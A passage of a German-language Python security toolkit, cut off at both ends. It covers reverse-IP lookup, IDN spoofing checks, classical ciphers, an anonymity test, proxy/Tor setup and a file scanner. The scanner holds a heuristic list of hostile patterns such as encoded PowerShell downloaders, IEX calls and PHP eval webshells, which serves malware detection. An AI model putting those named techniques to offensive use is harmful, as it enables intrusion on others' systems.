        ip = socket.gethostbyname(host)
        row("IP", ip)
        print(f"  {DG}Suche andere Domains auf {ip} (HackerTarget) ...{R}\n")
        body, _, _ = get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", timeout=12)
        domains = [d.strip() for d in body.splitlines() if d.strip() and "error" not in d.lower()]
        if domains:
            print(f"  {YG}{len(domains)} Domain(s) auf derselben IP:{R}\n")
            for d in domains[:50]:
                print(f"  {G}  {d}{R}")
            if len(domains) > 50:
                print(f"  {DIM}  ... und {len(domains)-50} weitere{R}")
        else:
            print(f"  {G}Keine weiteren Domains gefunden (oder Rate-Limit erreicht).{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()

# ── 78  IDN HOMOGRAPH CHECKER ────────────────────────────────
def idn_homograph():
    hdr("IDN HOMOGRAPH CHECKER")
    print(f"  {DG}Erkennt Unicode-Spoofing (z.B. pаypal.com mit kyrillischem 'а'){R}\n")
    t    = inp("Domain prüfen")
    host = re.sub(r"https?://","",t).split("/")[0].strip()
    if not host: wait(); return
    div()
    # Encode to punycode to detect non-ASCII
    try:
        encoded = host.encode("idna").decode("ascii")
    except Exception as e:
        print(f"  {G}[!] Fehler: {e}{R}"); wait(); return

    is_idn = encoded != host or host.startswith("xn--")
    row("Eingabe",   host)
    row("Punycode",  encoded)
    row("IDN",       "JA — enthält Unicode-Zeichen!" if is_idn else "Nein")

    if is_idn:
        div()
        print(f"  {G}[!] Diese Domain enthält nicht-ASCII Zeichen!{R}")
        print(f"  {G}    Mögliches Phishing/Spoofing-Angriff.{R}")
        # Show suspicious characters
        for i, ch in enumerate(host):
            if ord(ch) > 127:
                print(f"  {YG}  Zeichen [{i}]: '{ch}' (U+{ord(ch):04X}) — nicht-ASCII!{R}")
    else:
        print(f"  {G}[✓] Domain enthält nur ASCII-Zeichen. Kein IDN-Spoofing.{R}")

    # Also check for common look-alike ASCII tricks
    look_alikes = {"rn": "m", "vv": "w", "cl": "d", "0": "o", "1": "l", "5": "s"}
    suspicious = []
    for pattern, looks_like in look_alikes.items():
        if pattern in host.lower():
            suspicious.append(f"'{pattern}' könnte wie '{looks_like}' aussehen")
    if suspicious:
        div()
        print(f"  {YG}Verdächtige ASCII-Kombinationen:{R}")
        for s in suspicious:
            print(f"  {G}  [?] {s}{R}")
    wait()

# ── 79  CIPHER TOOLS ─────────────────────────────────────────
def cipher_tools():
    hdr("CIPHER TOOLS")
    print(f"  {DG}1{R} {G}» Vigenère{R}")
    print(f"  {DG}2{R} {G}» Atbash{R}")
    print(f"  {DG}3{R} {G}» Rail-Fence{R}")
    print(f"  {DG}4{R} {G}» ROT47{R}")
    print(f"  {DG}5{R} {G}» Morse Code (Text → Morse){R}")
    print(f"  {DG}6{R} {G}» Hex En/Decoder{R}")
    print(f"  {DG}7{R} {G}» URL En/Decoder{R}")
    mode = inp("Methode (1-7)")
    div()

    if mode == "1":
        key  = inp("Vigenère-Key (nur Buchstaben)")
        text = inp("Text")
        enc  = inp("Modus: e=Verschlüsseln, d=Entschlüsseln")
        if not key or not text: wait(); return
        key = re.sub(r"[^a-zA-Z]","", key).upper()
        if not key: key = "KEY"
        out = ""
        ki  = 0
        for ch in text:
            if ch.isalpha():
                shift = ord(key[ki % len(key)]) - ord("A")
                if enc.lower() == "d": shift = -shift
                b = ord("A") if ch.isupper() else ord("a")
                out += chr((ord(ch) - b + shift) % 26 + b)
                ki += 1
            else:
                out += ch
        print(f"  {G}{out}{R}")

    elif mode == "2":
        text = inp("Text")
        tr = str.maketrans(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
            "ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba")
        print(f"  {G}{text.translate(tr)}{R}")

    elif mode == "3":
        text  = inp("Text")
        rails = inp("Anzahl Schienen (2-10)")
        try: rails = max(2, min(int(rails), 10))
        except: rails = 3
        enc = inp("Modus: e=Verschlüsseln, d=Entschlüsseln")
        if enc.lower() == "e":
            fence = [[] for _ in range(rails)]
            rail, step = 0, 1
            for ch in text:
                fence[rail].append(ch)
                if rail == 0: step = 1
                elif rail == rails-1: step = -1
                rail += step
            print(f"  {G}{''.join(''.join(r) for r in fence)}{R}")
        else:
            n = len(text)
            pattern = []
            rail, step = 0, 1
            for i in range(n):
                pattern.append(rail)
                if rail == 0: step = 1
                elif rail == rails-1: step = -1
                rail += step
            indices = sorted(range(n), key=lambda i: (pattern[i], i))
            result  = [''] * n
            for pos, char in zip(indices, text):
                result[pos] = char
            print(f"  {G}{''.join(result)}{R}")

    elif mode == "4":
        text = inp("Text (ROT47 ist selbst-invers)")
        out  = ""
        for ch in text:
            if 33 <= ord(ch) <= 126:
                out += chr(33 + (ord(ch) - 33 + 47) % 94)
            else:
                out += ch
        print(f"  {G}{out}{R}")

    elif mode == "5":
        text = inp("Text → Morse")
        MORSE = {
            'A':'.-','B':'-...','C':'-.-.','D':'-..','E':'.','F':'..-.','G':'--.','H':'....','I':'..','J':'.---',
            'K':'-.-','L':'.-..','M':'--','N':'-.','O':'---','P':'.--.','Q':'--.-','R':'.-.','S':'...','T':'-',
            'U':'..-','V':'...-','W':'.--','X':'-..-','Y':'-.--','Z':'--..',
            '0':'-----','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....',
            '6':'-....','7':'--...','8':'---..','9':'----.',
            '.':'.-.-.-',',':'--..--','?':'..--..','!':'-.-.--',' ':'/'
        }
        out = " ".join(MORSE.get(ch.upper(), "?") for ch in text)
        print(f"  {G}{out}{R}")

    elif mode == "6":
        print(f"  {DG}e=Encode  d=Decode{R}")
        enc  = inp("Modus")
        text = inp("Text")
        if enc.lower() == "e":
            print(f"  {G}{text.encode().hex()}{R}")
        else:
            try:
                print(f"  {G}{bytes.fromhex(text.replace(' ','')).decode('utf-8','replace')}{R}")
            except Exception as e:
                print(f"  {G}[!] {e}{R}")

    elif mode == "7":
        print(f"  {DG}e=Encode  d=Decode{R}")
        enc  = inp("Modus")
        text = inp("Text / URL")
        if enc.lower() == "e":
            print(f"  {G}{urllib.parse.quote(text)}{R}")
        else:
            print(f"  {G}{urllib.parse.unquote(text)}{R}")

    wait()

# ── 80  ANONYMITY & DNS-LEAK TEST ────────────────────────────
def anonymity_test():
    hdr("ANONYMITY & DNS-LEAK TEST")
    print(f"  {DG}Analysiert wie exponiert deine Verbindung ist.{R}\n")
    div()

    # Step 1: Public IP
    print(f"  {DG}[1/4] Öffentliche IP ermitteln ...{R}")
    ip_info = {}
    try:
        d = getj("http://ip-api.com/json/?fields=66846719", timeout=8)
        ip_info = d
        row("Öffentliche IP",  d.get("query","?"))
        row("Land",            d.get("country","?"))
        row("Stadt",           d.get("city","?"))
        row("ISP",             d.get("isp","?"))
        row("Org",             d.get("org","?"))
        row("Tor",             "JA ⚠" if d.get("tor")   else "Nein")
        row("VPN (erkannt)",   "JA ⚠" if d.get("vpn")   else "Nein")
        row("Proxy (erkannt)", "JA ⚠" if d.get("proxy") else "Nein")
        row("Hosting/DC",      "JA"    if d.get("hosting") else "Nein")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")

    # Step 2: DNS leak check — query multiple DNS APIs and see which resolver answers
    div()
    print(f"  {DG}[2/4] DNS-Leak Check ...{R}\n")
    dns_servers_seen = []
    test_domains = [
        "whoami.akamai.net",
        "o-o.myaddr.l.google.com",
    ]
    for domain in test_domains:
        try:
            ip2 = socket.gethostbyname(domain)
            dns_servers_seen.append(ip2)
            print(f"  {G}DNS-Resolver sieht:  {ip2}{R}")
        except: pass
    # Use DNS-over-HTTPS to check what Google sees
    try:
        d2 = getj("https://dns.google/resolve?name=whoami.akamai.net&type=A", timeout=6)
        for ans in d2.get("Answer",[]):
            v = ans.get("data","")
            if v and v not in dns_servers_seen:
                dns_servers_seen.append(v)
                print(f"  {G}Google DoH sieht:    {v}{R}")
    except: pass

    my_ip = ip_info.get("query","")
    dns_leak = any(ip != my_ip for ip in dns_servers_seen) if my_ip and dns_servers_seen else False

    # Step 3: Check multiple "what is my IP" services
    div()
    print(f"  {DG}[3/4] Cross-Check IP über mehrere Dienste ...{R}\n")
    ip_services = [
        ("api.ipify.org",    "https://api.ipify.org?format=json",          "ip"),
        ("api.my-ip.io",     "https://api.my-ip.io/ip.json",               "ip"),
        ("ipinfo.io",        "https://ipinfo.io/json",                      "ip"),
    ]
    ips_seen = set()
    for name, url, key in ip_services:
        try:
            d3 = getj(url, timeout=6)
            ip3 = d3.get(key,"?")
            ips_seen.add(ip3)
            print(f"  {G}  {name:<20} → {ip3}{R}")
        except:
            print(f"  {DG}  {name:<20} → Fehler{R}")

    # Step 4: Anonymity score
    div()
    print(f"  {DG}[4/4] Anonymity Score ...{R}\n")
    score  = 100
    issues = []

    if not ip_info.get("tor"):
        score -= 30
        issues.append("Kein Tor erkannt (-30) → Echte IP sichtbar")
    if not ip_info.get("vpn") and not ip_info.get("proxy"):
        score -= 20
        issues.append("Kein VPN/Proxy erkannt (-20)")
    if dns_leak:
        score -= 25
        issues.append("DNS-Leak erkannt! (-25) → ISP sieht deine Anfragen")
    if ip_info.get("hosting"):
        score += 10
        issues.append("Datacenter-IP (+10) → schwerer zu einer Person zuzuordnen")
    if len(ips_seen) > 1:
        score -= 15
        issues.append(f"Verschiedene IPs über Dienste (-15): {ips_seen}")

    score = max(0, min(score, 100))
    level = f"{G}Hoch" if score >= 70 else f"{YG}Mittel" if score >= 40 else f"{G}Niedrig"
    print(f"  {YG}Anonymity Score: {score}/100 — Schutz: {level}{R}\n")
    for issue in issues:
        print(f"  {DG}  → {issue}{R}")

    div()
    print(f"  {YG}── Empfehlungen ─────────────────────────────────────{R}\n")
    if not ip_info.get("vpn"):
        print(f"  {G}  [!] Verwende ein VPN (ProtonVPN, Mullvad, etc.){R}")
    if not ip_info.get("tor"):
        print(f"  {G}  [!] Tor Browser für maximale Anonymität{R}")
    if dns_leak:
        print(f"  {G}  [!] DNS-Leak: Konfiguriere DNS-over-HTTPS in deinem System{R}")
    print(f"  {G}  [i] Teste auch: https://browserleaks.com / https://dnsleaktest.com{R}")
    wait()

# ── 81  MALWARE / VIRUS SCANNER ──────────────────────────────
def _mb_check(check_hash):
    """Prüft einen Hash gegen MalwareBazaar. Gibt (status, entry_or_None) zurück."""
    try:
        data_post = urllib.parse.urlencode({"query":"get_info","hash": check_hash}).encode()
        req = urllib.request.Request(
            "https://mb-api.abuse.ch/api/v1/",
            data=data_post,
            headers={"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded"})
        with urllib.request.urlopen(req, timeout=12) as r:
            result = json.loads(r.read().decode())
        if result.get("query_status") == "ok":
            data_list = result.get("data",[])
            return "malware", data_list[0] if data_list else None
        elif result.get("query_status") == "hash_not_found":
            return "clean", None
        else:
            return "unknown", None
    except:
        return "error", None

def _print_mb_result(status, entry, check_hash):
    if status == "malware" and entry:
        print(f"  {G}[!!!] MALWARE ERKANNT!{R}\n")
        row("Dateiname",   entry.get("file_name","?"))
        row("Dateityp",    entry.get("file_type","?"))
        row("Signatur",    entry.get("signature","?") or "?")
        row("Reporter",    entry.get("reporter","?"))
        row("Datum",       entry.get("first_seen","?")[:10])
        tags = entry.get("tags",[])
        if tags: row("Tags", ", ".join(tags[:6]))
    elif status == "malware":
        print(f"  {G}[!] In MalwareBazaar vorhanden (keine Details).{R}")
    elif status == "clean":
        print(f"  {G}[✓] Nicht in MalwareBazaar — wahrscheinlich sauber.{R}")
    else:
        print(f"  {DG}[?] MalwareBazaar nicht erreichbar.{R}")
    if check_hash:
        print(f"\n  {DG}VirusTotal:       {G}https://www.virustotal.com/gui/file/{check_hash}{R}")
        print(f"  {DG}Hybrid-Analysis:  {G}https://www.hybrid-analysis.com/search?query={check_hash}{R}")

def malware_scanner():
    hdr("MALWARE / VIRUS SCANNER")
    print(f"  {DG}1{R} {G}» Einzelne Datei scannen{R}")
    print(f"  {DG}2{R} {G}» Hash direkt prüfen{R}")
    print(f"  {DG}3{R} {G}» Ganzen PC / Ordner scannen{R}")
    mode = inp("Modus (1/2/3)")
    div()

    # ── Modus 1: Einzelne Datei ──────────────────────────────
    if mode == "1":
        path = inp("Dateipfad")
        try:
            with open(path,"rb") as f:
                data = f.read()
            md5    = hashlib.md5(data).hexdigest()
            sha256 = hashlib.sha256(data).hexdigest()
            size   = len(data)
            row("Datei",   path)
            row("Größe",   f"{size:,} Bytes ({size/1024:.1f} KB)")
            row("MD5",     md5)
            row("SHA256",  sha256)
        except FileNotFoundError:
            print(f"  {G}[!] Datei nicht gefunden{R}"); wait(); return
        except Exception as e:
            print(f"  {G}[!] {e}{R}"); wait(); return
        div()
        print(f"  {DG}Prüfe gegen MalwareBazaar ...{R}\n")
        status, entry = _mb_check(sha256)
        _print_mb_result(status, entry, sha256)

    # ── Modus 2: Hash direkt ─────────────────────────────────
    elif mode == "2":
        h = inp("Hash (MD5 oder SHA256)").strip().lower()
        if len(h) not in (32, 64):
            print(f"  {G}[!] Ungültige Hash-Länge{R}"); wait(); return
        div()
        print(f"  {DG}Prüfe gegen MalwareBazaar ...{R}\n")
        status, entry = _mb_check(h)
        _print_mb_result(status, entry, h)

    # ── Modus 3: PC / Ordner Scan ────────────────────────────
    elif mode == "3":
        print(f"  {DG}Scan-Pfad (leer = ganzer PC, oder z.B. C:\\Users\\...){R}")
        scan_root = inp("Pfad").strip()
        if not scan_root:
            scan_root = "C:\\" if os.name == "nt" else "/"

        # Scan nur verdächtige Endungen um Speed zu halten
        SCAN_EXT = {
            ".exe",".dll",".bat",".cmd",".ps1",".vbs",".vbe",".js",".jse",
            ".wsf",".wsh",".msi",".scr",".hta",".pif",".com",".reg",".lnk",
            ".jar",".py",".sh",".elf",".bin",".dmp",".cpl",".ocx",".sys",
        }
        # Verdächtige Heuristik-Muster in Textdateien
        HEURISTIC_PATTERNS = [
            (rb"powershell.*-enc",            "PowerShell Base64-Encoded Command"),
            (rb"powershell.*bypass",           "PowerShell ExecutionPolicy Bypass"),
            (rb"IEX\s*\(",                     "PowerShell IEX Invoke-Expression"),
            (rb"invoke-expression",            "PowerShell Invoke-Expression"),
            (rb"downloadstring|downloadfile",  "PowerShell Downloader"),
            (rb"net\.webclient",               "PowerShell WebClient"),
            (rb"shellcode",                    "Shellcode-Referenz"),
            (rb"\x4d\x5a\x90\x00",            "PE-Header (EXE im Datei-Inhalt)"),
            (rb"cmd\.exe.*\/c",                "CMD /C Ausführung"),
            (rb"regsvr32.*scrobj",             "regsvr32 Script-Ausführung (LoLBin)"),
            (rb"wscript\.shell",               "WScript.Shell COM-Objekt"),
            (rb"createobject.*wscript",        "WScript CreateObject"),
            (rb"base64_decode",                "Base64-Decode (PHP/Script)"),
            (rb"eval\s*\(",                    "eval() Aufruf (WebShell?)"),
            (rb"<\?php.*eval",                 "PHP eval WebShell"),
            (rb"assert\s*\(\s*base64",         "PHP assert+base64 WebShell"),
        ]
        # Verdächtige Pfade die immer gescannt werden
        SUSPICIOUS_DIRS_WIN = [
            os.path.expandvars(r"%TEMP%"),
            os.path.expandvars(r"%APPDATA%\Roaming"),
            os.path.expandvars(r"%APPDATA%\Local\Temp"),
            os.path.expandvars(r"%PROGRAMDATA%"),
            os.path.expandvars(r"%USERPROFILE%\Downloads"),
            os.path.expandvars(r"%USERPROFILE%\Desktop"),
            os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"),
            r"C:\Windows\Temp",
            r"C:\Windows\System32\Tasks",
            r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp",
        ]
        SUSPICIOUS_DIRS_LIN = [
            "/tmp", "/var/tmp", "/dev/shm",
            os.path.expanduser("~/.local/bin"),
            os.path.expanduser("~/Desktop"),
            "/etc/cron.d", "/etc/cron.daily",
            "/etc/init.d", "/etc/rc.local",
        ]

        div()
        print(f"  {DG}Scanne: {G}{scan_root}{R}\n")
        print(f"  {DG}Geprüfte Endungen: {', '.join(sorted(SCAN_EXT))}{R}\n")

        found_suspicious = []  # (pfad, grund, sha256)
        scanned = 0
        skipped = 0
        errors  = 0
        MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 MB max pro Datei

        def _heuristic_check(path, data):
            """Gibt Liste von gefundenen Heuristik-Treffern zurück."""
            hits = []
            data_l = data[:4096].lower()  # nur erste 4KB für Geschwindigkeit
            for pattern, label in HEURISTIC_PATTERNS:
                if re.search(pattern, data_l, re.IGNORECASE):
                    hits.append(label)
            # Doppel-Endung: z.B. invoice.pdf.exe
            name = os.path.basename(path).lower()
            parts = name.split(".")
            if len(parts) >= 3:
                inner_ext = "." + parts[-2]
                outer_ext = "." + parts[-1]
                benign = {".pdf",".doc",".docx",".xls",".xlsx",".jpg",".png",".txt",".zip"}
                if inner_ext in benign and outer_ext in SCAN_EXT:
                    hits.append(f"Doppel-Endung: {inner_ext}{outer_ext} (Tarnung!)")
            return hits

        try:
            for dirpath, dirnames, filenames in os.walk(scan_root):
                # Überspringe System-Verzeichnisse die immer sauber sind
                dirnames[:] = [d for d in dirnames if d not in
                               {"Windows","$Recycle.Bin","System Volume Information",
                                "proc","sys","dev","run"}]
                for fname in filenames:
                    ext = os.path.splitext(fname)[1].lower()
                    if ext not in SCAN_EXT:
                        skipped += 1
                        continue
                    fpath = os.path.join(dirpath, fname)
                    scanned += 1
                    sys.stdout.write(f"\r  {DG}Gescannt: {G}{scanned}{DG}  Verdächtig: {G}{len(found_suspicious)}{DG}  Übersprungen: {scanned+skipped}{R}   ")
                    sys.stdout.flush()
                    try:
                        fsize = os.path.getsize(fpath)
                        if fsize > MAX_FILE_SIZE:
                            skipped += 1; continue
                        if fsize == 0:
                            skipped += 1; continue
                        with open(fpath, "rb") as f:
                            data = f.read()
                        sha256 = hashlib.sha256(data).hexdigest()
                        hits = _heuristic_check(fpath, data)
                        if hits:
                            found_suspicious.append((fpath, hits, sha256, fsize))
                    except PermissionError:
                        errors += 1
                    except Exception:
                        errors += 1
        except KeyboardInterrupt:
            print(f"\n  {YG}[!] Scan abgebrochen.{R}")

        print(f"\n\n  {G}Scan abgeschlossen.{R}")
        div()
        row("Gescannte Dateien",    str(scanned))
        row("Übersprungen",         str(skipped))
        row("Zugriffsfehler",       str(errors))
        row("Verdächtige Dateien",  str(len(found_suspicious)))

        if not found_suspicious:
            print(f"\n  {G}[✓] Keine verdächtigen Dateien gefunden.{R}")
            wait(); return

        div()
        print(f"  {YG}── Verdächtige Dateien ──────────────────────────────{R}\n")
        for i, (fpath, hits, sha256, fsize) in enumerate(found_suspicious[:50], 1):
            print(f"  {G}[{i:>2}] {fpath[:65]}{R}")
            print(f"       {DG}SHA256: {DIM}{sha256[:40]}...{R}")
            print(f"       {DG}Größe:  {sha256[:0]}{fsize:,} Bytes{R}")
            for h in hits:
                print(f"       {YG}⚠ {h}{R}")
            print()
        if len(found_suspicious) > 50:
            print(f"  {DIM}... und {len(found_suspicious)-50} weitere{R}\n")

        # Online-Check der verdächtigen Dateien
        div()
        do_check = inp("Verdächtige Dateien gegen MalwareBazaar prüfen? (j/n)")
        if do_check.lower() in ("j","ja","y","yes"):
            print()
            # Rate-Limit: max 20 Checks
            check_list = found_suspicious[:20]
            if len(found_suspicious) > 20:
                print(f"  {DG}(Rate-Limit: nur erste 20 von {len(found_suspicious)} werden geprüft){R}\n")
            confirmed_malware = []
            for fpath, hits, sha256, fsize in check_list:
                sys.stdout.write(f"  {DG}Prüfe: {os.path.basename(fpath)[:40]:<40}{R}")
                sys.stdout.flush()
                status, entry = _mb_check(sha256)
                if status == "malware":
                    sig = entry.get("signature","?") if entry else "?"
                    confirmed_malware.append((fpath, sha256, sig))
                    print(f"  {G}[!!!] MALWARE: {sig}{R}")
                elif status == "clean":
                    print(f"  {G}[✓]{R}")
                else:
                    print(f"  {DG}[?]{R}")
                time.sleep(0.3)  # API Rate-Limit schonen

            if confirmed_malware:
                div()
                print(f"  {G}[!!!] {len(confirmed_malware)} bestätigte Malware-Datei(en):{R}\n")
                for fpath, sha256, sig in confirmed_malware:
                    print(f"  {G}  {fpath}{R}")
                    print(f"  {YG}  Signatur: {sig}{R}")
                    print(f"  {DG}  VT: https://www.virustotal.com/gui/file/{sha256}{R}\n")
            else:
                print(f"\n  {G}[✓] Keine der verdächtigen Dateien ist in MalwareBazaar bekannt.{R}")
    else:
        wait(); return

    wait()

# ── 82  PROXY / VPN SETUP ────────────────────────────────────
def proxy_vpn_setup():
    global _PROXY_URL
    hdr("PROXY / VPN SETUP")
    print(f"  {DG}Aktueller Proxy: {YG}{_PROXY_URL if _PROXY_URL else 'keiner (direkte Verbindung)'}{R}\n")

    print(f"  {DG}1{R} {G}» Tor automatisch erkennen & aktivieren{R}")
    print(f"  {DG}2{R} {G}» Eigenen Proxy eingeben (HTTP/SOCKS5){R}")
    print(f"  {DG}3{R} {G}» Proxy deaktivieren (direkte Verbindung){R}")
    print(f"  {DG}4{R} {G}» Verbindung testen (IP vorher/nachher){R}")
    print(f"  {DG}5{R} {G}» Anleitung: Tor installieren{R}")
    print(f"  {DG}6{R} {G}» Freie Proxies holen & testen (auto-suggest){R}")
    print(f"  {DG}7{R} {G}» System-weiten Proxy setzen (Browser, alles){R}")
    print(f"  {DG}8{R} {G}» System-weiten Proxy entfernen{R}")
    mode = inp("Modus (1-8)")
    div()

    # ── 1: Tor auto-detect ───────────────────────────────────
    if mode == "1":
        print(f"  {DG}Suche Tor auf lokalen Ports ...{R}\n")
        tor_found = None
        tor_ports = [
            ("SOCKS5", "127.0.0.1", 9050),   # Tor daemon
            ("SOCKS5", "127.0.0.1", 9150),   # Tor Browser
            ("HTTP",   "127.0.0.1", 8118),   # Privoxy → Tor
            ("HTTP",   "127.0.0.1", 8888),   # andere Tor-HTTP-Bridge
        ]
        for proto, host, port in tor_ports:
            try:
                s = socket.socket()
                s.settimeout(1)
                s.connect((host, port))
                s.close()
                url = f"socks5://{host}:{port}" if proto == "SOCKS5" else f"http://{host}:{port}"
                print(f"  {G}[✓] {proto} Proxy gefunden: {url}{R}")
                tor_found = url
                break
            except:
                print(f"  {DG}[-] {proto} {host}:{port} — nicht erreichbar{R}")

        if tor_found:
            # HTTP-Proxy (Privoxy) nativ nutzbar, SOCKS5 braucht PySocks
            if tor_found.startswith("socks"):
                try:
                    import socks
                    _PROXY_URL = tor_found
                    save_config({"proxy_url": _PROXY_URL})
                    print(f"\n  {G}[✓] PySocks gefunden — SOCKS5 Proxy aktiviert: {_PROXY_URL}{R}")
                except ImportError:
                    # Fallback: versuche Privoxy auf 8118
                    http_fallback = "http://127.0.0.1:8118"
                    try:
                        s2 = socket.socket(); s2.settimeout(1)
                        s2.connect(("127.0.0.1", 8118)); s2.close()
                        _PROXY_URL = http_fallback
                        save_config({"proxy_url": _PROXY_URL})
                        print(f"\n  {YG}[!] PySocks nicht installiert.{R}")
                        print(f"  {G}[✓] Privoxy HTTP-Proxy aktiviert: {_PROXY_URL}{R}")
                        print(f"  {DG}    Tipp: pip install PySocks  für direkten SOCKS5-Support{R}")
                    except:
                        print(f"\n  {YG}[!] PySocks nicht installiert und Privoxy nicht gefunden.{R}")
                        print(f"  {DG}    Installiere PySocks: pip install PySocks{R}")
                        print(f"  {DG}    Oder Privoxy: sudo apt install privoxy  (leitet Port 8118 → Tor){R}")
            else:
                _PROXY_URL = tor_found
                save_config({"proxy_url": _PROXY_URL})
                print(f"\n  {G}[✓] HTTP-Proxy aktiviert: {_PROXY_URL}{R}")
            print(f"\n  {DG}Alle Tool-Anfragen gehen jetzt durch den Proxy.{R}")
        else:
            print(f"\n  {G}[!] Kein Tor-Proxy gefunden.{R}")
            print(f"  {DG}→ Starte Tor Browser oder installiere Tor (Option 5).{R}")

    # ── 2: Manueller Proxy ───────────────────────────────────
    elif mode == "2":
        print(f"  {DG}Formate:{R}")
        print(f"  {G}  HTTP:   http://IP:PORT   z.B. http://127.0.0.1:8118{R}")
        print(f"  {G}  SOCKS5: socks5://IP:PORT z.B. socks5://127.0.0.1:9050{R}")
        print(f"  {G}  Mit Auth: http://user:pass@IP:PORT{R}\n")
        url = inp("Proxy-URL").strip()
        if not url:
            print(f"  {G}[!] Nichts eingegeben.{R}")
        else:
            _PROXY_URL = url
            save_config({"proxy_url": _PROXY_URL})
            print(f"\n  {G}[✓] Proxy gesetzt: {_PROXY_URL}{R}")
            print(f"  {DG}Alle Tool-Anfragen gehen jetzt durch diesen Proxy.{R}")

    # ── 3: Proxy deaktivieren ────────────────────────────────
    elif mode == "3":
        _PROXY_URL = ""
        save_config({"proxy_url": ""})
        print(f"  {G}[✓] Proxy deaktiviert — direkte Verbindung aktiv.{R}")

    # ── 4: Verbindungstest ───────────────────────────────────
    elif mode == "4":
        print(f"  {DG}[1/2] IP ohne Proxy ...{R}")
        try:
            req_direct = urllib.request.Request(
                "http://ip-api.com/json/?fields=query,country,isp",
                headers={"User-Agent":"Mozilla/5.0"})
            with urllib.request.urlopen(req_direct, timeout=8) as r:
                d_direct = json.loads(r.read().decode())
            print(f"  {G}Direkte IP: {d_direct.get('query','?')}  ({d_direct.get('country','?')}, {d_direct.get('isp','?')[:40]}){R}")
        except Exception as e:
            print(f"  {G}[!] {e}{R}")

        if _PROXY_URL:
            print(f"  {DG}[2/2] IP über Proxy ({_PROXY_URL}) ...{R}")
            try:
                body2, _, _ = get("http://ip-api.com/json/?fields=query,country,isp")
                d_proxy = json.loads(body2)
                print(f"  {G}Proxy IP:   {d_proxy.get('query','?')}  ({d_proxy.get('country','?')}, {d_proxy.get('isp','?')[:40]}){R}")
                same = d_direct.get("query") == d_proxy.get("query")
                if same:
                    print(f"\n  {YG}[!] GLEICHE IP — Proxy leitet Traffic nicht weiter!{R}")
                else:
                    print(f"\n  {G}[✓] Verschiedene IPs — Proxy funktioniert!{R}")
            except Exception as e:
                print(f"  {G}[!] Proxy-Anfrage fehlgeschlagen: {e}{R}")
        else:
            print(f"  {DG}[2/2] Kein Proxy konfiguriert — übersprungen.{R}")

    # ── 5: Anleitung ─────────────────────────────────────────
    elif mode == "5":
        print(f"  {YG}── Tor installieren & mit Fleiplei nutzen ───────────{R}\n")
        if os.name == "nt":
            print(f"  {G}Windows:{R}")
            print(f"  {DG}  1. Tor Browser laden: https://www.torproject.org/download/{R}")
            print(f"  {DG}  2. Tor Browser starten (läuft auf Port 9150){R}")
            print(f"  {DG}  3. Hier Option 1 wählen — Tor wird automatisch erkannt{R}")
            print(f"  {DG}  4. Oder PySocks installieren: pip install PySocks{R}")
            print(f"\n  {G}Alternativ — Tor als Dienst:{R}")
            print(f"  {DG}  winget install TorProject.TorBrowser{R}")
        else:
            print(f"  {G}Linux:{R}")
            print(f"  {DG}  sudo apt install tor privoxy{R}")
            print(f"  {DG}  sudo systemctl start tor{R}")
            print(f"  {DG}  echo 'forward-socks5t / 127.0.0.1:9050 .' >> /etc/privoxy/config{R}")
            print(f"  {DG}  sudo systemctl start privoxy{R}")
            print(f"\n  {G}Schnellste Methode mit PySocks:{R}")
            print(f"  {DG}  pip install PySocks && sudo systemctl start tor{R}")
        print(f"\n  {DG}Tipp: Tor Browser reicht — einfach offen lassen, dann Option 1.{R}")

    # ── 6: Freie Proxies holen & testen ──────────────────────
    elif mode == "6":
        print(f"  {DG}Lade freie Proxy-Liste ...{R}\n")
        raw_proxies = []
        sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=elite",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=anonymous",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        ]
        for src in sources:
            try:
                req2 = urllib.request.Request(src, headers={"User-Agent":"Mozilla/5.0"})
                with urllib.request.urlopen(req2, timeout=10) as r2:
                    for line in r2.read().decode(errors="ignore").splitlines():
                        line = line.strip()
                        if re.match(r'^\d+\.\d+\.\d+\.\d+:\d+$', line):
                            raw_proxies.append(line)
            except: pass
        raw_proxies = list(dict.fromkeys(raw_proxies))  # dedupe
        print(f"  {G}{len(raw_proxies)} Proxies gefunden. Teste die ersten 80 ...{R}\n")
        working = []
        lock2   = threading.Lock()
        sem2    = threading.Semaphore(30)
        def _test_proxy(proxy_str):
            with sem2:
                purl = f"http://{proxy_str}"
                try:
                    ph = urllib.request.ProxyHandler({"http": purl, "https": purl})
                    op = urllib.request.build_opener(ph)
                    t0 = time.time()
                    with op.open("http://ip-api.com/json/?fields=query,country", timeout=6) as r3:
                        d3  = json.loads(r3.read().decode())
                        ms  = int((time.time()-t0)*1000)
                        ip3 = d3.get("query","?")
                        cc  = d3.get("country","?")
                    with lock2:
                        working.append((ms, proxy_str, ip3, cc))
                        sys.stdout.write(f"\r  {G}[✓] {len(working)} funktionierende Proxies gefunden ...{R}   ")
                        sys.stdout.flush()
                except: pass
        thds2 = [threading.Thread(target=_test_proxy, args=(p,), daemon=True)
                 for p in raw_proxies[:80]]
        for t2 in thds2: t2.start()
        for t2 in thds2: t2.join()
        print()
        if not working:
            print(f"\n  {G}[!] Keine funktionierenden Proxies gefunden.{R}")
            wait(); return
        working.sort(key=lambda x: x[0])
        div()
        print(f"  {YG}── Schnellste funktionierende Proxies ───────────────{R}\n")
        for i, (ms, proxy_str, ip3, cc) in enumerate(working[:10], 1):
            print(f"  {G}[{i:>2}]{R} {DG}{proxy_str:<22}{R} {G}{ms:>5}ms{R}  {DG}{cc} ({ip3}){R}")
        print(f"\n  {DG}0 = nichts auswählen{R}")
        choice2 = inp(f"Proxy wählen (1-{min(10,len(working))})")
        try:
            idx2 = int(choice2)
            if 1 <= idx2 <= min(10, len(working)):
